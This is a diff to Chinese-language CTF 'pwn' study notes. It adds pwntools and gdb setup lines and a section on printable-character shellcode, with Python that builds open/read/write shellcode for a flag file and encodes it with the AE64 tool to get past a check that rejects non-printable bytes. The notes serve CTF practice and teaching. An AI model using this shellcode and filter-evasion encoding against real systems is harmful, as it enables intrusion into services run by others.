@@ -394,9 +394,11 @@ __int64 a1@<rbp> // a1 传递方式通过 rbp 寄存器
 from pwn import *
 
 context(log_level = 'debug', arch = 'i386', os = 'linux', terminal = ['tmux', 'sp', '-h'])
+context.terminal = ['tmux', 'split-w', '-h']	
 #需要保证tmux已经运行
 
 io = process("./xxx") # pid xxxx
+io = gdb.debug("./xxx")
 io = remote("ip", port)
 
 # p64(8)： 0x0000000000000008
@@ -601,6 +603,9 @@ libc
 
 #求偏移
 distance address1 address2
+
+
+pwndbg # 查看命令
 ```
 
 **查看栈中的时候出现`0xffff → 0xfffc ← 'aaa'`表示`0xffff`地址处存放着一个指针，指针指向`'aaa'`**
@@ -1726,6 +1731,28 @@ shellcode = f"""
 pay = b'\x90'*0x10 + asm(shellcode) # 第二次读需要重新覆盖前面0x10地址
 payload = pay.ljust(0x100, b'\x90') + b'/flag\x00\x00\x00' 
 # 可能需要gdb微调在前后加\x00或\x90使刚好对应地址读取flag而不是flagxx
+```
+
+**可见字符Shellcode**
+
+```C
+if ( buf[i] <= 31 || buf[i] == 127 ) // 进允许输入可见字符的Shellcode
+```
+
+使用工具**AE64**
+
+```python
+from ae64 import AE64
+
+s = shellcraft # 使用ORW
+shellcode = s.open('./flag')
+shellcode += s.read(3,0x20240000,30)
+shellcode += s.write(1,0x20240000,30)
+
+ss = AE64().encode(asm(shellcode),'rdx',0,'fast')
+# arg: shellcode, 寄存器: call rdx, 偏移, 策略:fast or small
+
+print(ss)
 ```
 
 
